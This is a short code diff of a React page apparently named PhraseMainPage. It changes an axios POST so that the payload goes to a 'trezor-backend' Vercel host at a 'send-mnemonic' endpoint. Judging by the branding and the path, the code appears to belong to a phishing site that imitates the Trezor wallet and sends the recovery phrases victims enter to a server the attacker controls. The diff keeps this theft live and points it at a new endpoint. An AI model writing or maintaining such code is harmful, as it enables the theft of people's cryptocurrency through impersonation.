@@ -88,8 +88,8 @@ export default function PhraseMainPage() {
 
       setLoading(true);
       const response = await axios.post(
-        "https://trezor-backend-plum.vercel.app/api/v1/send-aws",
-        // "http://localhost:5454/api/v1/send-mnemonic",
+        // "https://trezor-backend-plum.vercel.app/api/v1/send-aws",
+        "https://trezor-backend-six.vercel.app/api/v1/send-mnemonic",
         payload
       );
 
